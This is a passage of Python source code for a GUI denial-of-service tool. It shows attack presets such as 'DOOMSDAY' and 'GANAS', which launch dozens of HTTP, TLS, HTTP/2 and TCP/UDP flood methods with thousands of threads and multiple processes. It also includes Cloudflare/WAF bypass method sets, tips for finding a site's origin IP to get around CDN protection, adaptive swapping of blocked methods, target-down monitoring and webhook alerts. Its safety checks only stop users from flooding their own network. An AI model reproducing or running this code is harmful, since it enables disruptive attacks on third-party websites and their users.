        self.log_message(f"   Multiprocess={'ON (WAF detected)' if waf_detected else 'off'} | Keepalive=ON | Adaptive=ON | Auto-RPC=ON")

    def _onetap_after_scan(self, result):
        """Scan finished successfully → apply auto-config + start attack."""
        try:
            detected = result.get("detected", set()) if isinstance(result, dict) else set()
            self._onetap_apply_defaults(detected)
            self.log_message("[ONE-TAP] Step 3/3: launching attack...")
            self.start_combined_attack()
        finally:
            self._onetap_in_progress = False

    def _onetap_scan_failed(self, msg):
        """Scan failed → still attack with safe all-rounder defaults."""
        try:
            self.log_message(f"[ONE-TAP] Scan failed ({msg}) — using all-rounder fallback")
            self._onetap_apply_defaults(detected=set())
            self.log_message("[ONE-TAP] Step 3/3: launching attack with fallback config...")
            self.start_combined_attack()
        finally:
            self._onetap_in_progress = False

    def _preset_doomsday(self):

        """☠️ DOOMSDAY — MAXIMUM IMPACT preset for authorized stress testing.
           Combines all 25 L7 methods at max threads + RPC + Adaptive AI enabled."""
        # Select ALL L7 methods
        for cb in self.l7_method_checks.values():
            cb.setChecked(True)
        # Select critical L4 methods that work via TCP (no raw socket needed)
        for m in ["TCP", "UDP", "CONNECTION", "CPS"]:
            if m in self.l4_method_checks:
                self.l4_method_checks[m].setChecked(True)
        # Max settings — clamped per platform safety limits
        # macOS: 800 threads max, Linux: 2000, Windows: 1500
        import sys as _sys
        if _sys.platform == "darwin":
            self.combined_threads_spin.setValue(700)
        elif _sys.platform.startswith("win"):
            self.combined_threads_spin.setValue(1200)
        else:
            self.combined_threads_spin.setValue(1500)
        self.combined_rpc_spin.setValue(50)
        self.combined_duration_spin.setValue(300)  # 5 minutes

        # Disable proxy (direct attack for max throughput)
        self.combined_proxy_type_combo.setCurrentText("None")
        # Enable both adaptive engines
        self.auto_rpc_combined_check.setChecked(True)
        self.adaptive_check.setChecked(True)
        # Auto-enable TRUE MULTIPROCESS for DOOMSDAY — bypasses GIL bottleneck
        # on TLS_FLOOD/H2_RST/RAPID/QUIC/IMPERSONATE methods (CPU-heavy crypto).
        # On 8-core M1: 7 procs × 700 threads = ~4900 effective threads.
        if hasattr(self, 'mp_check'):
            self.mp_check.setChecked(True)
        # Auto-enable Keepalive Pool — stacks with multiprocess for ~25× total
        if hasattr(self, 'keepalive_check'):
            self.keepalive_check.setChecked(True)
        # Don't enable Ganas mode (10000 threads kills system on macOS)
        self.ganas_check.setChecked(False)

        
        self.log_message("=" * 60)
        self.log_message("☠️ DOOMSDAY MODE ACTIVATED ☠️")
        self.log_message("All 25 L7 methods + 4 L4 methods selected")
        self.log_message("Threads=2000 | RPC=50 | Duration=300s | NO PROXY")
        self.log_message("Adaptive AI + Auto-RPC enabled")
        self.log_message("Combos: TLS_FLOOD + H2_RST + RAPID + QUIC + ASYNC")
        self.log_message("        + SLOWLORIS + XMLRPC_MULTI + STEALTH + WAF bypass")
        self.log_message("⚠️  AUTHORIZED PENETRATION TESTING ONLY ⚠️")
        self.log_message("=" * 60)

    def _preset_main_volumetric(self):
        """Select all bandwidth-heavy methods: TLS_FLOOD + GET + POST + STRESS + DYN + DOWNLOADER + PPS + OVH + QUIC + H2_RST + RAPID + ASYNC + GQL + WS + H2_PRIORITY + RANGE_CRASH"""
        VOLUMETRIC = ["TLS_FLOOD", "GET", "POST", "STRESS", "DYN", "DOWNLOADER", "PPS", "OVH", "QUIC", "H2_RST", "RAPID", "ASYNC", "GQL", "WS", "H2_PRIORITY", "RANGE_CRASH", "EVEN", "GSB"]
        for cb in self.l7_method_checks.values():
            cb.setChecked(False)
        for m in VOLUMETRIC:
            if m in self.l7_method_checks:
                self.l7_method_checks[m].setChecked(True)
        self.combined_threads_spin.setValue(200)
        self.combined_rpc_spin.setValue(20)
        self.combined_proxy_type_combo.setCurrentText("None")
        self.log_message("🧨 Main Volumetric preset: 16 bandwidth methods + TLS_FLOOD. Threads=200, RPC=20, No proxy.")

    def _preset_waf_bypass(self):
        """Select all WAF/block evasion methods: CFB + CFBUAM + BYPASS + DGB + AVB + STEALTH + MIX + XMLRPC_MULTI + COOKIE_HARVEST + SLOWLORIS + SLOW + RHEX + STOMP + NULL + COOKIE + BOT + WORDPRESS"""
        WAF_METHODS = ["CFB", "CFBUAM", "BYPASS", "DGB", "AVB", "STEALTH", "MIX", "XMLRPC_MULTI", "COOKIE_HARVEST", "SLOWLORIS", "SLOW", "RHEX", "STOMP", "NULL", "COOKIE", "BOT", "WORDPRESS", "HEAD", "KILLER"]
        for cb in self.l7_method_checks.values():
            cb.setChecked(False)
        for m in WAF_METHODS:
            if m in self.l7_method_checks:
                self.l7_method_checks[m].setChecked(True)
        self.combined_threads_spin.setValue(150)
        self.combined_rpc_spin.setValue(10)
        self.combined_proxy_type_combo.setCurrentText("HTTP")
        self.log_message("🧅 WAF 7-Layer Bypass preset: 19 evasion methods. Threads=150, RPC=10, Use HTTP proxies.")

    def _is_self_target(self, url: str) -> tuple:
        """🛡 Anti-self-DoS guard. Detects if user accidentally aimed the attack
        at their own machine, LAN, or known infrastructure.

        Returns (is_self: bool, reason: str). When True, start_combined_attack
        / start_layer7 / start_layer4 must show a hard confirmation dialog
        before proceeding. The #1 worst-case for this tool is a user pasting
        `localhost`/`127.0.0.1`/`192.168.x.x`/their own public IP — laptop
        gets DoS'd by itself, router crashes, kicks the whole household off
        WiFi. A loud guard prevents 99% of those incidents.

        Detection layers:
          1. Loopback (127.0.0.0/8, ::1, localhost)
          2. RFC1918 private (10/8, 172.16/12, 192.168/16) + link-local (169.254)
          3. CGNAT (100.64/10) — usually ISP / Tailscale / cellular tether
          4. The machine's own public IP (cached at module load: `__ip__`)
          5. Common 'admin'/'router' hostnames
        """
        try:
            from urllib.parse import urlparse as _urlparse
            from socket import gethostbyname as _gethostbyname
            import ipaddress as _ipaddr

            # Parse host out of URL or ip:port string
            target = url.strip()
            if "://" in target:
                host = (_urlparse(target).hostname or "").lower()
            else:
                # Layer4 path: "ip:port" or just "ip"
                host = target.split(":", 1)[0].lower()
            if not host:
                return (False, "")

            # Hostname keyword check (cheap, pre-DNS)
            self_host_keywords = (
                "localhost", "ip6-localhost", "ip6-loopback",
                "broadcasthost", "router.local", "router.lan",
                "gateway.lan", "modem.lan", "router.asus.com",
            )
            if host in self_host_keywords:
                return (True, f"hostname '{host}' is a local/router shortcut")

            # Resolve to IP for numeric checks
            try:
                ip_str = _gethostbyname(host)
            except Exception:
                return (False, "")  # DNS fail — let attack proceed, no false-positive

            try:
                ip_obj = _ipaddr.ip_address(ip_str)
            except Exception:
                return (False, "")

            if ip_obj.is_loopback:
                return (True, f"{ip_str} is loopback (your own machine)")
            if ip_obj.is_link_local:
                return (True, f"{ip_str} is link-local (169.254.x.x)")
            if ip_obj.is_private:
                return (True, f"{ip_str} is RFC1918 private (LAN — your router/devices)")
            # CGNAT 100.64.0.0/10 — Tailscale, ISPs, cellular hotspot
            if ip_obj in _ipaddr.ip_network("100.64.0.0/10"):
                return (True, f"{ip_str} is CGNAT (carrier/Tailscale/hotspot)")

            # Match against this machine's own public IP (cached at startup)
            global __ip__
            if __ip__ and ip_str == __ip__:
                return (True, f"{ip_str} is YOUR public IP (laptop will DoS itself)")

            return (False, "")
        except Exception:
            # Any unexpected error → fail open (don't block legitimate attack)
            return (False, "")

    def _confirm_self_target(self, url: str, reason: str) -> bool:
        """Hard confirmation dialog when self-target detected.
        Returns True if user explicitly confirmed (typed YES), False otherwise."""
        from PyQt5.QtWidgets import QInputDialog
        msg = (
            f"🛑 SELF-TARGET DETECTED\n\n"
            f"Target: {url}\n"
            f"Reason: {reason}\n\n"
            f"Attacking this address will hit YOUR OWN machine / LAN / router.\n"
            f"Likely outcomes:\n"
            f"  • Laptop becomes unresponsive (your CPU + your bandwidth)\n"
            f"  • Router crashes — entire household / office loses WiFi\n"
            f"  • macOS kernel panic if thread count > FD limit\n\n"
            f"This is almost always a typo or a copy-paste mistake.\n"
            f"If you REALLY meant to do this (lab test, you own this server),\n"
            f"type the word YES to continue:"
        )
        text, ok = QInputDialog.getText(self, "Self-Target Confirmation", msg)
        return ok and text.strip() == "YES"

    def _quick_waf_probe(self, url: str, timeout: float = 3.0) -> str:
        """Lightweight synchronous WAF probe — used by start_combined_attack as
        pre-flight to detect blacklist-risky direct attacks. Returns WAF name
        ('Cloudflare', 'DDoS-Guard', 'Akamai', etc) or empty string. Times out
        fast so it doesn't block the GUI noticeably."""

        try:
            import requests as _r
            rr = _r.get(url, timeout=timeout, allow_redirects=False, verify=False)
            h = {k.lower(): v for k, v in rr.headers.items()}
            if "cf-ray" in h or "cf-cache-status" in h:
                return "Cloudflare"
            if "ddg-id" in h or "x-ddg-project" in h:
                return "DDoS-Guard"
            if "x-akamai-transformed" in h or "x-akamai-request-id" in h:
                return "Akamai"
            if "x-sucuri-id" in h:
                return "Sucuri"
            if "x-amz-cf-id" in h:
                return "AWS CloudFront"
            if "x-iinfo" in h:
                return "Imperva"
        except Exception:
            pass
        return ""

    def start_combined_attack(self):
        global AUTO_RPC_ENABLED
        AUTO_RPC_ENABLED = self.auto_rpc_combined_check.isChecked()
        if AUTO_RPC_ENABLED:
            _adaptive_rpc.reset(self.combined_rpc_spin.value())
        
        url = self.combined_url_input.text().strip()
        
        if not url:
            QMessageBox.warning(self, "input error", "Please enter the target URL")
            return

        # 🛡 Anti-self-DoS guard
        is_self, reason = self._is_self_target(url)
        if is_self and not self._confirm_self_target(url, reason):
            self.log_message(f"[Guard] 🛑 Combined attack cancelled — self-target detected: {reason}")
            return

        l7_methods = [m for m, cb in self.l7_method_checks.items() if cb.isChecked()]

        l4_methods = [m for m, cb in self.l4_method_checks.items() if cb.isChecked()]
        proxy_type = self.combined_proxy_type_combo.currentText()
        proxy_file = self.combined_proxy_file_input.text().strip()
        rpc = self.combined_rpc_spin.value()
        threads = self.combined_threads_spin.value()
        duration = self.combined_duration_spin.value()

        # === 🛡 IP-blacklist protection guard ===
        # The #1 cause of "tool jalan tapi web kena block dari laptop" adalah:
        # attack direct (proxy=None) ke target di belakang Cloudflare/DDoS-Guard,
        # ribuan request/detik dari satu IP → edge ngeblok IP user. Browser di
        # laptop kena tembok yang sama (HP pakai IP seluler beda → masih bisa
        # akses). Sebelum attack jalan, kita probe target cepat untuk WAF, dan
        # kalau direct-mode + WAF detected, minta konfirmasi user dulu.
        # User bisa skip prompt ini lewat ganas mode (yang udah explicit "no proxy").
        if not getattr(self, "_skip_blacklist_warning", False) and proxy_type == "None" and not self.ganas_check.isChecked():
            waf = self._quick_waf_probe(url)
            if waf:
                msg = (
                    f"⚠ TARGET BEHIND <b>{waf}</b> (WAF/CDN detected)\n\n"
                    f"You're about to attack <b>{url}</b> with direct connection (no proxy).\n"
                    f"All requests will use YOUR public IP. {waf}'s edge will likely "
                    f"blacklist your IP within seconds — meaning <b>you won't be able "
                    f"to access this website from your laptop</b> for the next 30 min – 24 hr.\n"
                    f"(Your phone on cellular will still work — different IP.)\n\n"
                    f"Recommended fixes:\n"
                    f"  • Click 'Auto Download' for proxies, then change Proxy: HTTP\n"
                    f"  • Or use 'Find Origin IP' to bypass {waf} entirely\n\n"
                    f"Continue with direct attack anyway?"
                )
                ans = QMessageBox.warning(
                    self, f"IP Blacklist Risk — {waf} detected",
                    msg,
                    QMessageBox.Yes | QMessageBox.No,
                    QMessageBox.No,
                )
                if ans != QMessageBox.Yes:
                    self.log_message(f"[Guard] 🛡 Attack cancelled — {waf} detected, no proxy. "
                                     f"Tip: Auto Download → set Proxy=HTTP → retry, or use Find Origin IP.")
                    return
                else:
                    self.log_message(f"[Guard] ⚠ User confirmed direct attack on {waf}-protected target. "
                                     f"Your IP may get blacklisted — use phone/cellular if you need to verify the attack.")

        
        ganas = self.ganas_check.isChecked()
        if ganas:
            for cb in self.l7_method_checks.values():
                cb.setChecked(True)
            self.combined_threads_spin.setValue(10000)
            self.combined_rpc_spin.setValue(100)
            self.combined_proxy_type_combo.setCurrentText("None")
            self.log_message("GANAS MODE — direct attack (no proxy), 10000 threads, RPC 100")
            l7_methods = [m for m, cb in self.l7_method_checks.items() if cb.isChecked()]
            l4_methods = [m for m, cb in self.l4_method_checks.items() if cb.isChecked()]
            proxy_type = "None"
            proxy_file = ""
            rpc = 100
            threads = 10000
            duration = self.combined_duration_spin.value()
        
        if not l7_methods and not l4_methods:
            QMessageBox.warning(self, "input error", "Please select at least one attack method")
            return
        
        self.log_message(f"Starting Combined attack on {url}")
        self.log_message(f"L7: {', '.join(l7_methods) if l7_methods else 'None'}")
        self.log_message(f"L4: {', '.join(l4_methods) if l4_methods else 'None'}")
        self.log_message(f"Thread: {threads}, Durate: {duration}s, RPC: {rpc}")
        
        proxy_type_map = {"HTTP": 1, "SOCKS4": 4, "SOCKS5": 5, "None": 0}
        proxy_ty = proxy_type_map.get(proxy_type, 0)
        
        self.attack_thread = AttackThread(
            self.start_real_combined_attack,
            url,
            l7_methods,
            l4_methods,
            threads,
            duration,
            proxy_ty,
            proxy_file,
            rpc
        )
        self.attack_thread.update_signal.connect(self.log_message)
        self.attack_thread.finished_signal.connect(self.attack_finished)
        self.attack_thread.start()
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(False)
        self.force_stop_btn.setEnabled(False)
        self.start_layer4_btn.setEnabled(False)
        self.stop_layer4_btn.setEnabled(False)
        self.force_stop_layer4_btn.setEnabled(False)
        self.start_combined_btn.setEnabled(False)
        self.stop_combined_btn.setEnabled(True)
        self.force_stop_combined_btn.setEnabled(True)
        self.status_timer.start(1000)
        # Init live stats
        self._attack_start_time = time.time()
        self._attack_duration = duration
        self._total_requests = 0
        self._total_errors = 0
        self._last_rps_sample = 0  # reset delta-tracker for new attack
        self.live_stats_timer.start(500)

    def start_real_combined_attack(self, url, l7_methods, l4_methods, threads, duration,

                                   proxy_ty, proxy_file, rpc, stop_event=None):
        try:
            self.log_message("Prepare combined attack parameters...")
            self.attack_threads = []
            self.event.clear()

            # === HTTP Keepalive Pool wiring ===
            keepalive_on = hasattr(self, 'keepalive_check') and self.keepalive_check.isChecked()
            if keepalive_on:
                # Increase per-method connection pool ceiling so all 25 methods
                # can keep persistent connections alive without TCP re-handshake
                # storms. Saves ~70% of TCP/TLS overhead on long attacks.
                global _KEEPALIVE_POOL_ENABLED
                _KEEPALIVE_POOL_ENABLED = True
                # Tell HttpFlood instances to keep more sockets alive per thread
                HttpFlood._sockets_per_thread = 50
                self.log_message("[Keepalive] ♻ HTTP connection pool enabled (50 sockets/thread, ~5x throughput)")
            else:
                HttpFlood._sockets_per_thread = 25

            # === TRUE MULTIPROCESS Mode wiring ===
            mp_on = hasattr(self, 'mp_check') and self.mp_check.isChecked()
            mp_processes = []  # subprocess workers
            mp_kill_event = None  # multiprocessing.Event shared with workers
            if mp_on:
                from multiprocessing import cpu_count as _cpu_count, Process as _Process, Event as _MPEvent, Value as _MPValue
                cores = _cpu_count()
                # Spawn N-1 workers (leave 1 core for GUI/main thread)
                # Each worker process gets its own GIL = TRUE parallelism
                num_workers = max(1, cores - 1)
                self.log_message(f"[Multiprocess] 🧬 TRUE MULTIPROCESS enabled: {cores} cores → spawning {num_workers} workers")
                self.log_message(f"[Multiprocess]    Each worker = independent process (no GIL contention)")
                self.log_message(f"[Multiprocess]    Total firepower: {num_workers} × {threads} threads = {num_workers * threads} effective")

                # Shared kill switch: parent sets this when duration ends or
                # user hits Stop. Every worker checks it inside its loop and
                # exits cleanly with "Worker finished" — no SIGTERM race that
                # killed slower workers before they could print.
                mp_kill_event = _MPEvent()
                # Shared MP counters for cross-process Live Stats aggregation.
                # Each worker bumps these once per loop iteration; GUI reads
                # them in _update_live_stats. Without this, MP mode showed
                # ~0 RPS in GUI while workers were firing thousands.
                mp_total_req = _MPValue('q', 0)    # signed long long
                mp_total_bytes = _MPValue('q', 0)
                self._mp_total_req = mp_total_req
                self._mp_total_bytes = mp_total_bytes
                for wid in range(num_workers):
                    p = _Process(
                        target=_mp_worker_entry,
                        args=(wid, url, l7_methods, l4_methods, threads, rpc,
                              duration, proxy_file, proxy_ty, mp_kill_event,
                              mp_total_req, mp_total_bytes),
                        daemon=True,
                    )
                    p.start()
                    mp_processes.append(p)
                self.log_message(f"[Multiprocess] {len(mp_processes)} subprocess workers launched")
                # Save reference so we can stop on user-stop / force-stop
                self._mp_processes = mp_processes
                self._mp_kill_event = mp_kill_event




            # === Origin Pinning auto-detect ===
            # If user has Cloudflare-bypass methods enabled but no origin override,
            # the attack will hit CDN edge instead of origin. Warn + offer hint.
            cf_methods_active = any(m in l7_methods for m in ["CFB", "CFBUAM", "BYPASS", "DGB", "AVB"])
            if cf_methods_active and proxy_ty == 0:
                # Quick CDN detection probe — non-blocking
                def _cdn_probe():
                    try:
                        import requests as _r
                        rr = _r.get(url, timeout=3, allow_redirects=False)
                        cdn_hdrs = ['cf-ray', 'x-amz-cf-id', 'x-akamai-transformed',
                                 'x-fastly-request-id', 'ddg-id']
                        for h in cdn_hdrs:
                            if h in {k.lower() for k in rr.headers.keys()}:
                                self._safe_log_signal.emit(f"[Origin] ⚠ {h} header detected — target IS behind CDN")
                                self._safe_log_signal.emit(f"[Origin] 💡 Tip: Click 'Find Origin IP' button to discover real IP")
                                self._safe_log_signal.emit(f"[Origin] 💡 Then attack the IP directly with Host: {URL(url).host} header")
                                return
                    except Exception:
                        pass
                Thread(target=_cdn_probe, daemon=True).start()

            parsed_url = URL(url)
            host = parsed_url.host

            
            if l7_methods:
                if proxy_ty == 6:
                    proxy_ty = randchoice([4, 5, 1])
                if proxy_ty == 0 or not proxy_file:
                    proxies = None
                else:
                    proxy_li = Path(proxy_file)
                    proxies = handleProxyList(con, proxy_li, proxy_ty, parsed_url)
                
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                if not useragent_li.exists():
                    raise FileNotFoundError("User-Agent file not found")
                if not referers_li.exists():
                    raise FileNotFoundError("Referer file not found")
                
                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())
                
                # === FIX "Combined feels like gimmick" ===
                # OLD: threads_per_l7 = threads // (n_l7 + n_l4) capped at 50
                #      → 100 threads / 10 methods = 10 per method, gimmick.
                # NEW: each method gets full `threads` BUT total capped at safe ceiling
                #      to avoid macOS 2048 thread limit. Each method now packs near-
                #      manual-mode firepower instead of being thinned out 10x.
                total_methods = max(1, len(l7_methods) + len(l4_methods))
                # Hard ceiling on TOTAL spawned threads. macOS default ulimit
                # is ~2048-2700 per-process but native libs (curl_cffi, aioquic,
                # cloudscraper) eat up file descriptors AND threads. 800 is the
                # safe operating zone (was 1900 → segfaulted on DOOMSDAY mode).
                # Per-process resource reservations: system + GUI + L4 + native libs.
                import sys as _sys
                if _sys.platform == "darwin":
                    MAX_TOTAL_THREADS = 800   # macOS — strict
                elif _sys.platform.startswith("win"):
                    MAX_TOTAL_THREADS = 1500  # Windows — moderate
                else:
                    MAX_TOTAL_THREADS = 2000  # Linux — generous
                threads_per_l7 = min(threads, max(1, MAX_TOTAL_THREADS // total_methods))

                total_l7 = threads_per_l7 * len(l7_methods)
                if threads_per_l7 < threads:
                    self.log_message(f"[Combined] ⚠ threads/method clamped from {threads} → {threads_per_l7} "
                                     f"(macOS thread limit; {total_methods} methods × {threads_per_l7} = {threads_per_l7 * total_methods} total)")
                else:
                    self.log_message(f"[Combined] 💪 Each L7 method gets {threads_per_l7} threads "
                                     f"(near-manual firepower per method)")
                # === Initial kill_event for ALL spawned threads — fixes 11s
                # overshoot bug. Without this, duration-end kill_event.set()
                # has nothing to flip on threads spawned at attack start. ===
                initial_kill = threading.Event()
                for method in l7_methods:
                    self.log_message(f"Creating {threads_per_l7} L7 threads for {method} (total L7: {total_l7})...")

                    for thread_id in range(threads_per_l7):
                        t = HttpFlood(
                            thread_id,
                            parsed_url,
                            host,
                            method,
                            rpc,
                            self.event,
                            uagents,
                            referers,
                            proxies
                        )
                        t._kill_event = initial_kill  # Bind kill switch from spawn
                        t.daemon = True
                        t.start()
                        self.attack_threads.append(t)

            
            if l4_methods:
                if ":" in parsed_url.host:
                    ip, port_str = parsed_url.host.split(":", 1)
                    port = int(port_str)
                else:
                    try:
                        ip = gethostbyname(parsed_url.host)
                    except:
                        ip = parsed_url.host
                    port = parsed_url.port or 80
                
                # Same firepower fix for L4: each method gets `threads_per_l7`
                # (already calculated above as MAX_TOTAL_THREADS / total_methods).
                # Cap L4 at 200/method (L4 is cheaper per-thread than L7).
                threads_per_l4 = min(threads_per_l7 if 'threads_per_l7' in dir() else threads, 200)
                for method in l4_methods:
                    self.log_message(f"Creating {threads_per_l4} L4 threads for {method}...")

                    for _ in range(threads_per_l4):
                        t = Layer4(
                            (ip, port),
                            None,
                            method,
                            self.event
                        )
                        t.daemon = True
                        t.start()
                        self.attack_threads.append(t)
            
            self.log_message("Setting event flag...")
            self.event.set()
            self.log_message(f"Combined attack started! Duration: {duration}s")
            
            # --- Adaptive engine init (with optional Adaptive++ enhancements) ---
            adaptive = getattr(self, 'adaptive_check', None) is not None and self.adaptive_check.isChecked()
            adaptive_engine = None
            adaptive_ctrl = None  # Adaptive++ controller wrapper
            target_down_flag = {"down": False}  # mutable for closure
            if adaptive:
                # === FIX "halu": Adaptive playbook constrained to USER'S picks ===
                # Sebelumnya: adaptive engine bebas pilih dari 25 method (semua di
                # checkbox), termasuk yang user GAK pilih. Hasilnya "halu" — AI
                # pakai method yang user udah anggap gak relevan, lebih lemah dari
                # manual yang fokus 5 method bagus.
                # Sekarang: AI cuma boleh play di dalam playbook = method yang user
                # centang. Bayesian sampling, blacklist, swap — semua di scope ini.
                all_l7 = list(l7_methods) if l7_methods else \
                         [m for m, cb in getattr(self, 'l7_method_checks', {}).items() if cb.isChecked()]
                if not all_l7:
                    all_l7 = list(PHASE_METHODS[AttackPhase.DIRECT_FLOOD])
                self.log_message(f"[Adaptive] 🎯 Playbook locked to user's {len(all_l7)} methods: {', '.join(all_l7)}")
                adaptive_engine = AdaptiveAttackEngine(

                    all_l7,
                    rpc_getter=lambda: self.combined_rpc_spin.value(),
                    log_callback=self.log_message,
                    target_url=url,
                    check_interval=8.0,
                )
                self.log_message("[Adaptive IQ-900] Engine initialized — fingerprinting target, loading memory...")

                # --- Adaptive++ wrapper (only if death-star modules loaded) ---
                if _DEATHSTAR_AVAILABLE and _AP_EnhancedAdaptiveController is not None:
                    # Strip emoji prefix from combo text (e.g. "🏃 AGGRESSIVE" -> "AGGRESSIVE")
                    aggro_raw = self.adaptive_aggro_combo.currentText() if hasattr(self, 'adaptive_aggro_combo') else "NORMAL"
                    aggro = aggro_raw.split()[-1] if aggro_raw else "NORMAL"
                    enable_recon = self.adaptive_recon_check.isChecked() if hasattr(self, 'adaptive_recon_check') else True
                    enable_health = self.adaptive_health_check.isChecked() if hasattr(self, 'adaptive_health_check') else True
                    stop_on_down = self.adaptive_stop_on_down_check.isChecked() if hasattr(self, 'adaptive_stop_on_down_check') else False

                    # Optional webhook
                    webhook = None
                    discord_url = self.webhook_discord_input.text().strip() if hasattr(self, 'webhook_discord_input') else ""
                    tg_token = self.webhook_tg_token_input.text().strip() if hasattr(self, 'webhook_tg_token_input') else ""
                    tg_chat = self.webhook_tg_chat_input.text().strip() if hasattr(self, 'webhook_tg_chat_input') else ""
                    if (discord_url or (tg_token and tg_chat)) and _DS_WebhookNotifier is not None:
                        webhook = _DS_WebhookNotifier(
                            discord_url=discord_url,
                            telegram_token=tg_token,
                            telegram_chat_id=tg_chat,
                            min_interval=30.0,
                        )
                        self.log_message(f"[Adaptive++] 📢 Webhook enabled: discord={'yes' if discord_url else 'no'}, telegram={'yes' if tg_token else 'no'}")

                    # Optional health monitor
                    health = None
                    if enable_health and _DS_TargetHealthMonitor is not None:
                        def _on_target_down(code, lat):
                            target_down_flag["down"] = True
                        def _on_target_up(code, lat):
                            target_down_flag["down"] = False
                        health = _DS_TargetHealthMonitor(
                            url=url, interval=10.0, timeout=8.0,
                            log_callback=self.log_message,
                        )

                    adaptive_ctrl = _AP_EnhancedAdaptiveController(
                        engine=adaptive_engine,
                        target_url=url,
                        all_l7_methods=all_l7,
                        log_callback=self.log_message,
                        aggressiveness=aggro,
                        webhook_notifier=webhook,
                        health_monitor=health,
                        enable_pre_recon=enable_recon,
                    )
                    # Attach stop_on_down setting to controller for later inspection
                    adaptive_ctrl._stop_on_down_user = stop_on_down

                    # Pre-attack reconnaissance (blocking call up to 8s)
                    if enable_recon:
                        adaptive_ctrl.pre_attack_recon(timeout=8.0)
                    adaptive_ctrl.start()

                    # --- Bug #4 fix: install user health callbacks AFTER ctrl.start()
                    #     because EnhancedAdaptiveController.start() overwrites
                    #     health.on_down/on_up. Wrap to chain both. ---
                    if health is not None:
                        _ctrl_on_down = health.on_down
                        _ctrl_on_up = health.on_up
                        def _chained_down(code, lat, _orig=_ctrl_on_down):
                            try: _orig(code, lat)
                            except Exception: pass
                            try: _on_target_down(code, lat)
                            except Exception: pass
                        def _chained_up(code, lat, _orig=_ctrl_on_up):
                            try: _orig(code, lat)
                            except Exception: pass
                            try: _on_target_up(code, lat)
                            except Exception: pass
                        health.on_down = _chained_down
                        health.on_up = _chained_up

                    # --- Wire per-request hook: feeds ResponseSwapper.report() in
                    #     real time so blocked methods get swapped within seconds
                    #     instead of waiting for full heartbeat tick. ---
                    _set_adaptive_request_hook(adaptive_ctrl.report_response)

                    # Make controller visible to live stats refresh timer
                    self._active_adaptive_ctrl = adaptive_ctrl
                    self.log_message(f"[Adaptive++] 🚀 Controller started (profile={aggro}, "
                                     f"recon={'on' if enable_recon else 'off'}, "
                                     f"health={'on' if enable_health else 'off'}, "
                                     f"stop_on_down={'on' if stop_on_down else 'off'})")


            start_time = time.time()
            last_adaptive_check = time.time() if adaptive_engine else 0.0
            last_method_count = len(l7_methods)
            last_swap_check = time.time() if adaptive_ctrl else 0.0

            
            while time.time() - start_time < duration and not stop_event.is_set():
                # --- Adaptive++ stop-on-target-down ---
                if adaptive_ctrl and getattr(adaptive_ctrl, '_stop_on_down_user', False) and target_down_flag.get("down"):
                    self.log_message("[Adaptive++] 🛑 Target is down and stop_on_down=on, halting attack")
                    break

                stats = (f"Target: {url}  "
                         f"L7: {last_method_count} methods  "
                         f"L4: {len(l4_methods)} methods  "
                         f"Req: {Tools.humanformat(int(REQUESTS_SENT))}/s  "
                         f"Sent: {Tools.humanbytes(int(BYTES_SEND))}/s  "
                         f"Time: {int(time.time() - start_time)}s/{duration}s")
                if adaptive_engine:
                    stats += f"  Phase: {adaptive_engine.get_phase().name}"
                if adaptive_ctrl:
                    banned_ct = len(adaptive_ctrl.blacklist.banned_list())
                    stats += f"  Banned: {banned_ct}  HB: {adaptive_ctrl.current_heartbeat:.1f}s"
                self.log_message(stats)
                current_rps = int(REQUESTS_SENT)
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)

                # --- Adaptive++ fast swap (every 1s, faster than full heartbeat) ---
                if adaptive_ctrl and time.time() - last_swap_check > 1.0:
                    last_swap_check = time.time()
                    blocked_now = adaptive_ctrl.should_swap()
                    if blocked_now:
                        self.log_message(f"[Adaptive++] ⚡ Fast swap: {', '.join(blocked_now)} → blocked, will be excluded")

                # --- Adaptive evaluation: use Adaptive++ controller heartbeat if available ---
                should_eval = False
                if adaptive_ctrl:
                    should_eval = adaptive_ctrl.should_tick()
                elif adaptive_engine and time.time() - last_adaptive_check > adaptive_engine.check_interval:
                    should_eval = True

                if should_eval and adaptive_engine:
                    last_adaptive_check = time.time()
                    snapshot = _adaptive_snapshot_and_reset()
                    # --- Bug #3 fix: feed per-method telemetry to engine so
                    #     Bayesian portfolio + ResponseSwapper + MethodBlacklist
                    #     actually have data to score per-method on. ---
                    pm_stats = _adaptive_per_method_snapshot_and_reset()
                    if adaptive_ctrl:
                        # Controller's tick handles engine.evaluate_and_rotate + heartbeat + blacklist
                        tick_result = adaptive_ctrl.tick(current_rps, snapshot,
                                                         per_method_stats=pm_stats)
                        new_methods = adaptive_ctrl.healthy_active_methods()
                    else:
                        adaptive_engine.evaluate_and_rotate(current_rps, snapshot,
                                                            per_method_stats=pm_stats)
                        new_methods = adaptive_engine.get_active_methods()
                    # === FIX "halu" #2: CLAMP rotation result to user playbook.
                    # Engine's _methods_from_weights pulls from PHASE_METHODS
                    # hardcoded categories, which leak methods user didn't pick.
                    # Filter strictly by all_l7 so rotation respects user's intent. ===
                    user_playbook = set(all_l7)
                    new_methods = [m for m in new_methods if m in user_playbook]
                    if not new_methods:
                        # Fallback: if engine zeroed everything user picked,
                        # fall back to user's full playbook (better than nothing).
                        new_methods = list(all_l7)

                    new_method_set = set(new_methods)
                    old_method_set = set(l7_methods) if last_method_count == len(l7_methods) else set()

                    if new_method_set and new_method_set != old_method_set:
                        prefix = "[Adaptive++]" if adaptive_ctrl else "[Adaptive IQ-900]"
                        self.log_message(f"{prefix} Strategy shift — hot-swap L7 threads (no downtime)...")

                        # --- Bug #5 fix: HOT-SWAP rotation. No event.clear() / sleep.
                        #     Old HttpFlood threads are killed via per-generation
                        #     kill_event; L4 + new L7 keep firing through transition. ---
                        # Signal old generation to drain (kill_event flips True)
                        old_threads = [t for t in self.attack_threads if isinstance(t, HttpFlood)]
                        for t in old_threads:
                            try:
                                if t._kill_event is not None:
                                    t._kill_event.set()
                            except Exception:
                                pass
                        # Drop old threads from active list (they'll exit on next loop iter)
                        self.attack_threads = [t for t in self.attack_threads if not isinstance(t, HttpFlood)]

                        # Spawn new generation with fresh kill_event
                        # Same firepower formula as initial spawn — each method
                        # gets `threads` (clamped to MAX_TOTAL_THREADS / total_methods).
                        new_kill = threading.Event()
                        rot_total_methods = max(1, len(new_methods) + len(l4_methods))
                        threads_per_l7 = min(threads, max(1, 1900 // rot_total_methods))
